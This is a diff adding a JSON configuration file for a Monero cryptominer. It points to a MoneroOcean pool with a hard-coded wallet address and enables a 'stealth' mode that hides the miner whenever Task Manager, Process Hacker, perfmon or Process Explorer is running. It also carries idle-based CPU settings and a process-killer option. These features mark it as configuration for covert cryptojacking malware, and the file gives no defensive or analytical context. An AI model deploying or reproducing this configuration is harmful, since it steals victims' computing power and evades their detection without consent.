@@ -1,0 +1,17 @@
+{
+	"algo": "rx/0",
+	"pool": "gulf.moneroocean.stream",
+	"port": 20128,
+	"wallet": "846ngQghDrKSTF6ATa4fna1Go9zKYKTXyGcTNuD16E3bYMSFowkpoeghRKTGqX1zJ7317xWEiz4KuYg4LB2VHNNy2WifoGv",
+	"password": "",
+	"rig-id": "",
+	"nicehash": false,
+	"ssltls": true,
+	"max-cpu": 10,
+	"idle-wait": 2,
+	"idle-cpu": 80,
+	"stealth": true,
+	"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+	"process-killer": false,
+	"kill-targets": "program1.exe,program2.exe,program3.exe"
+}
